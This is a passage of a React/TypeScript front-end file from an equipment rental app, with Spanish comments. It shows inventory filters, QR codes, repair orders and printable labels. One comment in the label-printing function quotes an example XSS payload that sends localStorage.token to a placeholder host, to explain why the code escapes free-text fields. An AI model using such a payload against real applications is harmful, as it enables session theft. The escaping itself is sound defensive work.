                    {u.ubicacion_actual || 'Bodega'} · {u.numero_serie ? `serie ${u.numero_serie}` : 'sin número de serie'}
                  </p>
                </div>
                <div className="flex items-center gap-2 shrink-0">
                  {u.estado === 'rentado' && (
                    <button onClick={() => devolver(u)} className="px-3.5 h-9 rounded-lg border border-blue-500/30 text-blue-500 text-[13px] font-semibold hover:bg-blue-500/10 transition-colors">Devolver</button>
                  )}
                  {u.puede_rentarse && (
                    <button onClick={() => setRentUnit(u)} className="btn-renta px-4 h-9 rounded-lg text-[13px] font-bold">Rentar</button>
                  )}
                  {u.puede_venderse && (
                    <button onClick={() => setSellUnit(u)} className="px-4 h-9 rounded-lg border border-edge text-ink text-[13px] font-bold hover:border-gold/40 hover:text-gold-ink transition-colors">Vender</button>
                  )}
                  <button
                    onClick={e => {
                      if (menu?.id === u.id) { setMenu(null); return }
                      const r = e.currentTarget.getBoundingClientRect()
                      const alto = u.estado === 'disponible' ? 100 : 56
                      setMenu({ id: u.id, top: Math.min(r.bottom + 6, window.innerHeight - alto - 8), right: window.innerWidth - r.right })
                    }}
                    aria-label="Más acciones"
                    className="w-9 h-9 rounded-lg border border-edge text-mute hover:text-ink transition-colors grid place-items-center">
                    <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor"><circle cx="5" cy="12" r="1.7" /><circle cx="12" cy="12" r="1.7" /><circle cx="19" cy="12" r="1.7" /></svg>
                  </button>
                  {menu?.id === u.id && createPortal(
                    <>
                      <div className="fixed inset-0 z-[90]" onClick={() => setMenu(null)} />
                      <div className="fixed z-[91] w-48 bg-surface border border-edge rounded-xl shadow-[0_12px_30px_rgba(0,0,0,0.28)] py-1.5" style={{ top: menu.top, right: menu.right }}>
                        <button onClick={() => { setMenu(null); setQrUnit(u) }}
                          className="w-full text-left px-3.5 py-2 text-[13px] text-ink hover:bg-surface-2 transition-colors flex items-center gap-2.5">
                          <svg className="w-4 h-4 text-mute shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path d="M4 4h6v6H4zM14 4h6v6h-6zM4 14h6v6H4zM14 14h2v2h-2zM18 14h2v2h-2zM14 18h2v2h-2zM18 18h2v2h-2z" /></svg>
                          Ver / imprimir QR
                        </button>
                        {/* Solo si está libre Y quien mira puede borrar del catálogo.
                            Quitar una máquina del sistema es como se encubre una que
                            falta, así que es del DUEÑO. El backend lo rechaza igual;
                            esconderlo evita ofrecer un botón que va a fallar. */}
                        {u.estado === 'disponible' && puede('borrar_catalogo') && (
                          <button onClick={() => { setMenu(null); delUnit(u) }}
                            className="w-full text-left px-3.5 py-2 text-[13px] text-red-500 hover:bg-red-500/10 transition-colors flex items-center gap-2.5">
                            <svg className="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path strokeLinecap="round" strokeLinejoin="round" d="M6 7h12M9 7V5a1 1 0 011-1h4a1 1 0 011 1v2m1 0v12a1 1 0 01-1 1H8a1 1 0 01-1-1V7" /></svg>
                            Eliminar unidad
                          </button>
                        )}
                      </div>
                    </>,
                    document.body,
                  )}
                </div>
              </div>
              {u.renta_activa && (
                <div className="mt-2.5 text-[12.5px] bg-blue-500/10 border border-blue-500/20 rounded-lg px-3 py-2">
                  <p className="text-blue-500 font-semibold flex items-center gap-1.5">
                    <svg className="w-3.5 h-3.5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" /></svg>
                    {u.renta_activa.cliente || 'Cliente'}
                    {u.renta_activa.telefono_cliente && <span className="text-mute font-normal">· {u.renta_activa.telefono_cliente}</span>}
                  </p>
                  <p className="text-mute mt-0.5">Ubicación: {u.renta_activa.direccion}</p>
                  <p className={`mt-0.5 ${u.renta_activa.vencida ? 'text-red-400 font-semibold' : 'text-mute'}`}>
                    {u.renta_activa.vencida ? '⚠ Vencida — recoger' : `Vence ${u.renta_activa.fecha_fin} (${u.renta_activa.dias_restantes}d)`}
                  </p>
                </div>
              )}
            </div>
          ))}
        </div>
        </div>

        {/* Pie */}
        <div className="px-6 sm:px-7 py-4 border-t border-edge flex items-center justify-between gap-3">
          <p className="text-[12px] text-mute leading-tight">Las unidades nuevas solo se venden; las seminuevas se rentan y se venden.</p>
          <button onClick={onClose} className="shrink-0 px-6 py-2.5 rounded-xl bg-surface-2 border border-edge text-ink font-bold text-sm hover:border-gold/40 transition-colors">Cerrar</button>
        </div>
      </div>

      {qrUnit && <QRModal unit={qrUnit} equipo={equipo} onClose={() => setQrUnit(null)} />}
      {rentUnit && <RentModal unit={rentUnit} equipo={equipo} onClose={() => setRentUnit(null)} onDone={() => { setRentUnit(null); load() }} notify={notify} />}
      {sellUnit && <SellModal unit={sellUnit} equipo={equipo} onClose={() => setSellUnit(null)} onDone={() => { setSellUnit(null); load() }} notify={notify} />}
      {modalCobro}
    </Modal>
  )
}

/* ── QR de la unidad ── */
function QRModal({ unit, equipo, onClose }: { unit: Unidad; equipo: Equipo; onClose: () => void }) {
  const [dataUrl, setDataUrl] = useState<string>('')
  // URL viva: al escanear, el teléfono abre la ficha de la unidad.
  const payload = `${window.location.origin}/u/${unit.codigo}`
  useEffect(() => {
    QRCode.toDataURL(payload, { width: 320, margin: 1, color: { dark: '#000000', light: '#ffffff' } })
      .then(setDataUrl).catch(() => setDataUrl(''))
  }, [payload])

  function download() {
    const a = document.createElement('a')
    a.href = dataUrl
    a.download = `QR-${unit.codigo}.png`
    a.click()
  }

  return (
    <Modal className="modal-in fixed inset-0 z-[70] bg-black/70 backdrop-blur-sm flex items-center justify-center p-6" onClose={onClose} label={`Código QR de ${unit.codigo}`}>
      <div onClick={e => e.stopPropagation()} className="bg-surface border border-edge rounded-3xl p-8 max-w-xs w-full text-center">
        <h3 className="font-black text-ink mb-1">{unit.codigo}</h3>
        <p className="text-xs text-mute mb-5">{equipo.modelo}{unit.numero_serie ? ` · ${unit.numero_serie}` : ''}</p>
        <div className="bg-white rounded-2xl p-4 inline-block">
          {dataUrl ? <img src={dataUrl} alt="QR" className="w-48 h-48" /> : <div className="w-48 h-48 animate-pulse bg-neutral-200 rounded" />}
        </div>
        <p className="text-[11px] text-mute mt-4">Escanea para identificar la unidad y su estado.</p>
        <div className="flex gap-2 mt-5">
          <button onClick={onClose} className="flex-1 py-2.5 rounded-full border border-edge text-mute text-sm font-medium hover:text-ink transition-colors">Cerrar</button>
          <button onClick={download} className="flex-1 py-2.5 rounded-full bg-gold text-black text-sm font-bold hover:opacity-90 transition-opacity">Descargar</button>
        </div>
      </div>
    </Modal>
  )
}

/* ════════════════════════════════════════
   MÓDULO INVENTARIO (vista global de unidades)
════════════════════════════════════════ */
function InventarioGlobal({ unidades, equipos, reload, notify, onEnviarTaller, cargando }: {
  unidades: Unidad[]; equipos: Equipo[]; reload: () => void; notify: Notify
  onEnviarTaller: (ordenId: number) => void
  /** La lista todavía viene en camino: el vacío no es un vacío de verdad. */
  cargando?: boolean
}) {
  // Si venimos de "Concretar" una cotización —a rentar o a vender— arrancamos
  // filtrados al equipo que pidió el cliente y a las unidades disponibles: cae
  // directo en lo que hay que entregar.
  const puente = leerCotEnCurso()
  const [estado, setEstado] = useState<'' | 'disponible' | 'rentado' | 'mantenimiento' | 'vendido'>(puente?.equipo_id ? 'disponible' : '')
  const [equipoFiltro, setEquipoFiltro] = useState<string>(puente?.equipo_id ? String(puente.equipo_id) : '')
  /* Vienes a RENTAR: las unidades que solo se venden estorban. Se filtra por
     `puede_rentarse` y no por condición "seminueva" a propósito — una unidad
     NUEVA autorizada para renta (sustitución, demanda extraordinaria) sí se
     puede rentar, y filtrar por condición la escondería justo cuando hace falta.
     Es visible y se puede apagar: un filtro invisible parecería inventario
     perdido.

     Vienes a VENDER: NO se enciende. Cualquier máquina se vende, y la que más
     se vende es la NUEVA — que es justo la que este filtro esconde. Encenderlo
     por venir de una cotización dejaría la pantalla vacía con el inventario
     lleno. El equipo cotizado y "disponible" ya acotan lo suficiente. */
  const [soloRentables, setSoloRentables] = useState<boolean>(puente?.proposito === 'renta')
  const [search, setSearch] = useState('')
  const { devolver: devolverRenta, modalCobro } = useDevolverRenta(notify)
  const [labelUnit, setLabelUnit] = useState<Unidad | null>(null)
  const [rentUnit, setRentUnit] = useState<Unidad | null>(null)
  const [sellUnit, setSellUnit] = useState<Unidad | null>(null)
  const [mantUnit, setMantUnit] = useState<Unidad | null>(null)

  /* Todo lo filtrado MENOS el estado. De aquí salen los números de las
     pestañas: cada una dice cuántas te quedarían si la tocas, ya con el producto
     y la búsqueda aplicados. Si el estado entrara aquí, tocar "Disponibles"
     pondría las otras cuatro en cero y las pestañas no servirían de nada. */
  const enFoco = unidades.filter(u => {
    if (soloRentables && !seRenta(u)) return false
    if (equipoFiltro && String(u.equipo) !== equipoFiltro) return false
    if (search.trim()) {
      const q = search.trim().toLowerCase()
      const hay = `${u.codigo} ${u.numero_serie || ''} ${u.equipo_modelo || ''}`.toLowerCase()
      if (!hay.includes(q)) return false
    }
    return true
  })

  const filtered = enFoco.filter(u => {
    if (estado && u.estado !== estado) return false
    return true
  })
  // La flota solo crece. Las pestañas de estado siguen contando sobre `enFoco`
  // —el total con los filtros de arriba—, así que paginar no le quita a nadie la
  // respuesta de "cuántas hay".
  const { enPantalla, ancla, props: pagProps } = usePaginado(filtered, undefined,
    [estado, equipoFiltro, soloRentables, search])

  const porEstado = (lista: Unidad[]) => ({
    total: lista.length,
    disponible: lista.filter(u => u.estado === 'disponible').length,
    rentado: lista.filter(u => u.estado === 'rentado').length,
    mantenimiento: lista.filter(u => u.estado === 'mantenimiento').length,
    vendido: lista.filter(u => u.estado === 'vendido').length,
  })
  /* Dos cuentas distintas, a propósito:
       · Las TARJETAS de arriba son la foto de la bodega completa. Es un resumen;
         que se moviera al escribir en el buscador no diría nada de tu negocio.
       · Las PESTAÑAS son controles de la tabla que tienen debajo, así que cuentan
         lo que de verdad vas a ver. Antes decían "Disponibles 9" con tres
         renglones en pantalla y no había forma de saber a qué se refería el 9. */
  const counts = porEstado(unidades)
  const countsFiltrados = porEstado(enFoco)

  function devolver(u: Unidad) {
    if (!u.renta_activa) return
    devolverRenta(u.renta_activa.id, reload)
  }

  function liberarMant(u: Unidad) {
    api.post(`/unidades/${u.id}/mantenimiento/`, { accion: 'salir' })
      .then(() => { notify('Unidad liberada de mantenimiento'); reload() })
      .catch(() => notify('Error', 'err'))
  }

  return (
    <div className="space-y-5">
      {/* Si venimos de concretar una cotización —a rentar o a vender—, recuerda
          qué pidió el cliente y con qué verbo se cierra. */}
      <BannerConcretando inset={false} />
      {/* KPIs */}
      {/* Las cifras se leen CONTRA la flota operativa (total menos vendidas):
          "9 disponibles" no dice nada sin saber de cuántas. La barrita es el
          mismo porcentaje en forma de longitud, para verlo desde el mostrador. */}
      <KpiGrid
        items={(() => {
          const operativas = Math.max(counts.total - counts.vendido, 0)
          const pct = (n: number) => (operativas ? Math.round((n / operativas) * 100) : 0)
          return [
            {
              label: 'Total unidades', value: counts.total, tone: 'default' as const,
              helper: `${operativas} en la flota · ${counts.vendido} fuera`,
              icon: <><rect x="3" y="3" width="7" height="7" rx="1.5" /><rect x="14" y="3" width="7" height="7" rx="1.5" /><rect x="3" y="14" width="7" height="7" rx="1.5" /><rect x="14" y="14" width="7" height="7" rx="1.5" /></>,
            },
            {
              label: 'Disponibles', value: counts.disponible, tone: 'success' as const,
              helper: `${pct(counts.disponible)}% de la flota, lista para salir`, progreso: operativas ? counts.disponible / operativas : 0,
              icon: <><circle cx="12" cy="12" r="9" /><path d="m8.4 12 2.4 2.4 4.8-5" /></>,
            },
            {
              label: 'Rentadas', value: counts.rentado, tone: 'info' as const,
              helper: `${pct(counts.rentado)}% en obra ahora mismo`, progreso: operativas ? counts.rentado / operativas : 0,
              icon: <><rect x="3" y="4.5" width="18" height="16" rx="2" /><path d="M3 9h18M8 3v3m8-3v3" /></>,
            },
            {
              label: 'Mantenimiento', value: counts.mantenimiento, tone: 'warning' as const, emphasis: counts.mantenimiento > 0,
              helper: counts.mantenimiento ? 'no facturan mientras estén en el taller' : 'nada detenido',
              icon: <><path d="M14.7 6.3a4 4 0 0 0-5.6 5.6L3 18v3h3l6.1-6.1a4 4 0 0 0 5.6-5.6l-2.5 2.5-2.1-2.1z" /></>,
            },
            {
              label: 'Vendidas', value: counts.vendido, tone: 'muted' as const,
              helper: 'ya no cuentan como flota',
              icon: <><path d="M20.6 13.4 12 22l-9-9V3h10z" /><circle cx="7.5" cy="7.5" r="1.3" /></>,
            },
          ]
        })()}
      />

      <Card ref={ancla} className="overflow-hidden scroll-mt-24">
        {/* Filtros / toolbar */}
        <div className="px-5 py-4 border-b border-edge flex flex-col lg:flex-row lg:items-center gap-3">
          <FiltroChips
            valor={estado}
            onChange={k => setEstado(k as typeof estado)}
            opciones={[
              { valor: '', label: 'Todas', cuenta: countsFiltrados.total },
              { valor: 'disponible', label: 'Disponibles', cuenta: countsFiltrados.disponible },
              { valor: 'rentado', label: 'Rentadas', cuenta: countsFiltrados.rentado },
              { valor: 'mantenimiento', label: 'Mantenimiento', cuenta: countsFiltrados.mantenimiento },
              { valor: 'vendido', label: 'Vendidas', cuenta: countsFiltrados.vendido },
            ]}
          />
          <div className="flex gap-2 flex-1 lg:justify-end items-center">
            <button onClick={() => setSoloRentables(v => !v)} aria-pressed={soloRentables}
              title="Oculta las unidades que solo se pueden vender"
              className={`h-10 px-3.5 rounded-xl border text-[12.5px] font-bold whitespace-nowrap transition-colors ${soloRentables
                ? 'btn-renta border-transparent'
                : 'border-edge text-mute hover:text-ink hover:bg-surface-2'}`}>
              Solo rentables
            </button>
            <select aria-label="Filtrar por producto" value={equipoFiltro} onChange={e => setEquipoFiltro(e.target.value)} className={`${input} sm:w-48`}>
              <option value="" className="bg-surface">Todos los productos</option>
              {equipos.map(e => <option key={e.id} value={e.id} className="bg-surface">{e.modelo}</option>)}
            </select>
            <input aria-label="Buscar código o serie" className={`${input} sm:w-56`} value={search} onChange={e => setSearch(e.target.value)} placeholder="Buscar código o serie…" />
          </div>
        </div>

        {/* Tabla */}
        <div className="overflow-x-auto">
          <table className="tabla-panel w-full min-w-[820px] text-left">
            <thead>
              <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                <th className="font-semibold px-5 py-3">Etiqueta / Código</th>
                <th className="font-semibold px-3 py-3">Producto</th>
                <th className="font-semibold px-3 py-3">Condición</th>
                <th className="font-semibold px-3 py-3">Estado</th>
                <th className="font-semibold px-3 py-3">Ubicación / Cliente</th>
                <th className="font-semibold px-5 py-3 text-right">Acciones</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-edge">
              {enPantalla.map(u => (
                <tr key={u.id} className={`hover:bg-surface-2 transition-colors ${u.renta_activa?.vencida ? 'bg-red-500/5' : ''}`}>
                  {/* Código */}
                  <td className="px-5 py-3">
                    <span className="font-mono font-bold text-ink text-sm">{u.codigo}</span>
                    {u.numero_serie && <p className="text-[11px] text-mute">Serie {u.numero_serie}</p>}
                  </td>
                  {/* Producto */}
                  <td data-col="Producto" className="px-3 py-3">
                    <div className="flex items-center gap-2.5 min-w-0">
                      <div className="w-9 h-9 rounded-lg bg-surface-2 overflow-hidden shrink-0">
                        {u.equipo_info?.imagen && <img src={resolveMediaUrl(u.equipo_info.imagen)} alt="" className="w-full h-full object-cover" />}
                      </div>
                      <span className="text-sm text-ink truncate">{u.equipo_modelo}</span>
                    </div>
                  </td>
                  {/* Condición */}
                  <td data-col="Condición" className="px-3 py-3">
                    <div className="flex items-center gap-1.5 flex-wrap">
                      {pillCond(u.condicion)}
                      {/* Una máquina NUEVA saliendo a renta es una excepción que
                          alguien autorizó. El rastro se guardaba desde siempre y
                          no salía por ningún lado: para saber quién lo decidió
                          había que entrar a la base de datos. Aquí se ve, y al
                          pasar encima dice quién, cuándo y por qué. */}
                      {u.condicion === 'nueva' && u.autorizada_para_renta && (
                        <span
                          title={u.autorizacion_renta
                            ? `Autorizada por ${u.autorizacion_renta.por || 'alguien del equipo'} el ${new Date(u.autorizacion_renta.en).toLocaleDateString('es-MX')}${u.autorizacion_renta.nota ? ` · ${u.autorizacion_renta.nota}` : ''}`
                            : 'Autorizada para renta (sin rastro registrado)'}
                          className="inline-flex items-center gap-1 text-[10px] font-bold px-1.5 py-0.5 rounded border border-[color-mix(in_oklab,var(--c-taller)_34%,transparent)] bg-[color-mix(in_oklab,var(--c-taller)_10%,transparent)] text-taller-ink cursor-help"
                        >
                          <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.2" strokeLinecap="round"><path d="M12 3l7.5 3.5v5c0 4.3-3.1 7.6-7.5 9-4.4-1.4-7.5-4.7-7.5-9v-5z" /></svg>
                          Renta autorizada
                        </span>
                      )}
                    </div>
                  </td>
                  {/* Estado */}
                  <td data-col="Estado" className="px-3 py-3">
                    <div>
                      {pillEstado(u.estado)}
                      {u.estado === 'rentado' && u.renta_activa && (
                        <p className={`text-[11px] mt-1 ${u.renta_activa.vencida ? 'text-red-500 font-semibold' : 'text-mute'}`}>
                          {u.renta_activa.vencida ? '⚠ Vencida' : `${u.renta_activa.dias_restantes}d restantes`}
                        </p>
                      )}
                    </div>
                  </td>
                  {/* Ubicación / Cliente */}
                  <td data-col="Ubicación" className="px-3 py-3 max-w-[220px]">
                    {u.estado === 'rentado' && u.renta_activa ? (
                      <p className="text-xs text-mute truncate">{u.renta_activa.cliente || 'Cliente'} · {u.renta_activa.direccion}</p>
                    ) : (
                      <p className="text-xs text-mute truncate">{u.ubicacion_actual || '—'}</p>
                    )}
                  </td>
                  {/* Acciones */}
                  <td className="px-5 py-3">
                    <div className="flex flex-wrap items-center justify-end gap-1.5">
                      <button onClick={() => setLabelUnit(u)} title="Etiqueta / Imprimir" className="w-8 h-8 rounded-lg border border-edge text-mute hover:text-gold-ink hover:border-gold/40 transition-colors flex items-center justify-center">
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path strokeLinecap="round" strokeLinejoin="round" d="M6 9V2h12v7M6 18H4a2 2 0 01-2-2v-5a2 2 0 012-2h16a2 2 0 012 2v5a2 2 0 01-2 2h-2M6 14h12v8H6z" /></svg>
                      </button>
                      {u.estado === 'rentado' && <button onClick={() => devolver(u)} className="px-3 h-8 rounded-lg border border-blue-500/30 text-blue-500 text-xs font-semibold hover:bg-blue-500/10 transition-colors">Devolver</button>}
                      {u.estado === 'mantenimiento' && <button onClick={() => liberarMant(u)} title="Liberar manualmente (sin orden)" className="px-3 h-8 rounded-lg border border-amber-500/40 text-taller-ink text-xs font-semibold hover:bg-amber-500/10 transition-colors">Liberar</button>}
                      {u.estado === 'disponible' && (
                        <button onClick={() => setMantUnit(u)} title="Enviar a taller (crea orden de reparación)" className="w-8 h-8 rounded-lg border border-edge text-mute hover:text-taller-ink hover:border-amber-500/40 transition-colors flex items-center justify-center">
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path strokeLinecap="round" strokeLinejoin="round" d="M14.7 6.3a4 4 0 00-5.6 5.6L3 18v3h3l6.1-6.1a4 4 0 005.6-5.6l-2.5 2.5-2.1-2.1 2.5-2.5z" /></svg>
                        </button>
                      )}
                      {u.puede_rentarse && <button onClick={() => setRentUnit(u)} className="btn-renta px-3 h-8 rounded-full text-xs font-bold">Rentar</button>}
                      {u.puede_venderse && <button onClick={() => setSellUnit(u)} className="px-3 h-8 rounded-lg bg-gold text-black text-xs font-bold hover:opacity-90 transition-opacity">Vender</button>}
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
          {filtered.length === 0 && (cargando ? <FilasEsqueleto filas={6} columnas={4} /> : (
            <EstadoVacio
              titulo="Ninguna unidad con estos filtros"
              mensaje="Cada unidad es una máquina física con su código y su estado. Afloja los filtros o da de alta la primera desde su producto."
              icono={<><rect x="3" y="3" width="7" height="7" rx="1.5" /><rect x="14" y="3" width="7" height="7" rx="1.5" /><rect x="3" y="14" width="7" height="7" rx="1.5" /><rect x="14" y="14" width="7" height="7" rx="1.5" /></>}
            />
          ))}
        </div>
        <Paginador {...pagProps} nombre="unidades" />
      </Card>

      {labelUnit && <LabelModal unit={labelUnit} onClose={() => setLabelUnit(null)} />}
      {rentUnit && <RentModal unit={rentUnit} equipo={equipoFromUnit(rentUnit)} onClose={() => setRentUnit(null)} onDone={() => { setRentUnit(null); reload() }} notify={notify} />}
      {sellUnit && <SellModal unit={sellUnit} equipo={equipoFromUnit(sellUnit)} onClose={() => setSellUnit(null)} onDone={() => { setSellUnit(null); reload() }} notify={notify} />}
      {mantUnit && <EnviarTallerModal unit={mantUnit} onClose={() => setMantUnit(null)} onCreated={(id) => { setMantUnit(null); reload(); onEnviarTaller(id) }} notify={notify} />}
      {modalCobro}
    </div>
  )
}

/* ════════════════════════════════════════
   ENVIAR A TALLER (crea orden de reparación interna)
════════════════════════════════════════ */
function EnviarTallerModal({ unit, onClose, onCreated, notify }: {
  unit: Unidad; onClose: () => void; onCreated: (ordenId: number) => void; notify: Notify
}) {
  const [diag, setDiag] = useState('')
  const [busy, setBusy] = useState(false)
  const modelo = unit.equipo_modelo || unit.equipo_info?.modelo || 'Equipo'

  function submit() {
    setBusy(true)
    api.post<OrdenReparacion>('/reparaciones/', { tipo: 'interna', unidad: unit.id, diagnostico: diag.trim() })
      .then(r => { notify(`Orden ${r.data.folio} creada · unidad en taller`); onCreated(r.data.id) })
      .catch(err => notify(err?.response?.data?.detalle || 'No se pudo crear la orden', 'err'))
      .finally(() => setBusy(false))
  }

  return createPortal(
    <Modal className="fixed inset-0 z-[70] bg-[rgba(33,29,22,0.4)] backdrop-blur-[2px] flex items-start justify-center p-4 overflow-y-auto" onClose={onClose} label="Enviar a taller">
      <div onClick={e => e.stopPropagation()} className="bg-surface rounded-[18px] w-full sm:max-w-[640px] my-4 sm:my-auto overflow-hidden shadow-[0_24px_60px_rgba(33,29,22,0.2)] border border-edge">
        {/* Header */}
        <div className="px-[26px] pt-6 pb-[18px] border-b border-edge flex items-start justify-between gap-3">
          <div>
            <div className="text-[18px] font-extrabold text-ink leading-tight">Enviar a taller</div>
            <div className="text-[12.5px] text-mute mt-[3px]">Crea una orden de servicio interna</div>
          </div>
          <span className="font-mono text-[11px] font-bold text-gold-ink bg-gold-soft px-[11px] py-[5px] rounded-md shrink-0">{unit.codigo}</span>
        </div>

        {/* Equipo / Estado */}
        <div className="px-[26px] py-5 flex items-center gap-4 border-b border-edge">
          <div className="flex-1 min-w-0">
            <div className="text-[10.5px] font-bold tracking-[0.5px] text-mute mb-1">EQUIPO</div>
            <div className="text-[14px] font-bold text-ink truncate">{modelo}</div>
          </div>
          <div className="w-px h-[30px] bg-edge shrink-0" />
          <div className="flex-1 min-w-0">
            <div className="text-[10.5px] font-bold tracking-[0.5px] text-mute mb-1">ESTADO</div>
            <div className="text-[14px] font-bold text-ink">Disponible <span aria-hidden="true" className="text-mute/70">→</span> <span className="text-gold-ink">Mantenimiento</span></div>
          </div>
        </div>

        {/* Motivo */}
        <div className="px-[26px] pt-5 pb-1.5">
          <div className="text-[10.5px] font-bold tracking-[0.5px] text-mute mb-2">FALLA / MOTIVO (OPCIONAL)</div>
          <textarea aria-label="Falla reportada" value={diag} onChange={e => setDiag(e.target.value)} placeholder="Ej. No arranca, fuga de aceite, servicio preventivo…" autoFocus
            className="campo campo-area" />
        </div>

        {/* Acciones */}
        <div className="flex gap-2.5 px-[26px] pt-5 pb-6">
          <button onClick={onClose} className="flex-1 py-3 rounded-[9px] border border-edge text-ink font-bold text-[13.5px] hover:bg-surface-2 transition-colors">Cancelar</button>
          <button onClick={submit} disabled={busy} className="flex-1 py-3 rounded-[9px] bg-gold text-gold-on font-bold text-[13.5px] hover:opacity-90 transition-opacity disabled:opacity-50 flex items-center justify-center gap-2">
            {busy ? <span className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : null}
            Crear orden y enviar
          </button>
        </div>
      </div>
    </Modal>,
    document.body,
  )
}

/* ════════════════════════════════════════
   ETIQUETA IMPRIMIBLE CON QR (para pegar en la máquina)
════════════════════════════════════════ */
function LabelModal({ unit, onClose }: { unit: Unidad; onClose: () => void }) {
  const [qr, setQr] = useState('')
  const modelo = unit.equipo_modelo || unit.equipo_info?.modelo || 'Equipo'
  // URL viva: la etiqueta impresa lleva a la ficha de la unidad.
  const payload = `${window.location.origin}/u/${unit.codigo}`

  useEffect(() => {
    QRCode.toDataURL(payload, { width: 240, margin: 0, color: { dark: '#000000', light: '#ffffff' } })
      .then(setQr).catch(() => setQr(''))
  }, [payload])

  function imprimir() {
    const w = window.open('', '_blank', 'width=480,height=320')
    if (!w) return
    // Escapamos TODO lo interpolado: numero_serie y modelo son texto libre que
    // captura el personal. Sin escapar, un "N° de serie" como
    // <img src=x onerror="fetch('https://malo/?t='+localStorage.token)"> se
    // ejecutaría en el ORIGEN de la app al imprimir → robo de sesión/token.
    const esc = (s: unknown) => String(s ?? '').replace(/[&<>"']/g, c =>
      ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' } as Record<string, string>)[c])
    w.document.write(`<!doctype html><html><head><title>${esc(unit.codigo)}</title>
      <style>
        @page { size: 70mm 40mm; margin: 0; }
        * { box-sizing: border-box; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
        body { margin: 0; font-family: -apple-system, Segoe UI, Roboto, sans-serif; }
        .lbl { width: 70mm; height: 40mm; padding: 4mm; display: flex; gap: 4mm; align-items: center; border: 1px solid #000; }
        .info { flex: 1; min-width: 0; }
        .brand { font-size: 8pt; letter-spacing: 2px; font-weight: 800; }
        .model { font-size: 10pt; font-weight: 700; margin: 1mm 0; }
        .code { font-size: 18pt; font-weight: 900; font-family: monospace; }
        .cond { font-size: 7pt; text-transform: uppercase; color: #444; }
        img { width: 26mm; height: 26mm; }
      </style></head>
      <body onload="setTimeout(function(){window.print()},250)">
        <div class="lbl">
          <div class="info">
            <div class="brand">REMALI</div>
            <div class="model">${esc(modelo)}</div>
            <div class="code">${esc(unit.codigo)}</div>
            <div class="cond">${esc(unit.condicion)}${unit.numero_serie ? ' · ' + esc(unit.numero_serie) : ''}</div>
          </div>
          <img src="${esc(qr)}" alt="QR" />
        </div>
      </body></html>`)
    w.document.close()
    w.focus()
  }

  return (
    <Modal className="modal-in fixed inset-0 z-[70] bg-black/70 backdrop-blur-sm flex items-center justify-center p-6" onClose={onClose} label="Etiqueta de identificación">
      <div onClick={e => e.stopPropagation()} className="bg-surface border border-edge rounded-3xl p-7 max-w-sm w-full">
        <p className="text-[11px] font-mono uppercase tracking-[0.2em] text-gold-ink mb-4">Etiqueta de identificación</p>

        {/* Vista previa de la etiqueta (estilo sticker, siempre claro) */}
        <div className="rounded-xl bg-white text-black border border-black/10 p-4 flex items-center gap-4">
          <div className="flex-1 min-w-0">
            <p className="text-[10px] font-black tracking-[0.2em]">REMALI</p>
            <p className="text-sm font-bold truncate">{modelo}</p>
            <p className="text-2xl font-black font-mono leading-tight">{unit.codigo}</p>
            <p className="text-[10px] uppercase text-neutral-500">{unit.condicion}{unit.numero_serie ? ` · ${unit.numero_serie}` : ''}</p>
          </div>
          <div className="w-24 h-24 bg-white shrink-0">
            {qr ? <img src={qr} alt="QR" className="w-full h-full" /> : <div className="w-full h-full animate-pulse bg-neutral-200 rounded" />}
          </div>
        </div>

        <p className="text-[11px] text-mute mt-4">Escanea el QR para identificar la unidad, su producto y estado. Imprime y pega en la máquina.</p>

        <div className="flex gap-2 mt-5">
          <button onClick={onClose} className="flex-1 py-2.5 rounded-full border border-edge text-ink text-sm font-semibold hover:bg-surface-2 transition-colors">Cerrar</button>
          <button onClick={imprimir} disabled={!qr} className="flex-1 py-2.5 rounded-full bg-gold text-black text-sm font-bold hover:opacity-90 transition-opacity disabled:opacity-50 flex items-center justify-center gap-2">
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M6 9V2h12v7M6 18H4a2 2 0 01-2-2v-5a2 2 0 012-2h16a2 2 0 012 2v5a2 2 0 01-2 2h-2M6 14h12v8H6z" /></svg>
            Imprimir
          </button>
        </div>
      </div>
    </Modal>
  )
}

type FilaRecordatorio = {
  renta_id: number; equipo: string; codigo: string; cliente: string
  telefono: string; fecha_fin: string; dias: number
  tiene_cuenta: boolean; saldo: string
}

/* A quién hay que recordarle HOY que traiga la máquina.

   Esto es lo que sustituye al recargo por retraso. REMALI no cobra por tardarse,
   así que lo que devuelve la máquina al patio no es un cargo —solo infla una
   deuda que nadie va a cobrar— sino insistir a tiempo.

   El comando `recordar_rentas` avisa DENTRO de la app, pero solo alcanza a
   clientes con cuenta; la mayoría de las rentas de mostrador se levantan con un
   nombre y un teléfono. Para ésos existe esta lista, con el WhatsApp ya escrito.

   Y resuelve algo que el buzón no podía: el aviso de "Renta vencida" se creaba
   UNA vez por renta (`ref='vencida-{id}'`) y no volvía a salir nunca, así que
   una máquina con veinte días afuera se anunciaba el primer día y luego nada.
   Una lista no se "marca como leída": mientras la máquina no vuelva, ahí sigue. */
function RecordatoriosRentas() {
  const [datos, setDatos] = useState<{ vencidas: FilaRecordatorio[]; por_vencer: FilaRecordatorio[]; total: number } | null>(null)
  const [abierto, setAbierto] = useState(false)

  const load = useCallback(() => {
    api.get<{ vencidas: FilaRecordatorio[]; por_vencer: FilaRecordatorio[]; total: number }>(
      '/rentas/recordatorios/', { fondo: true })
      .then(r => setDatos(r.data)).catch(anotarFallo)
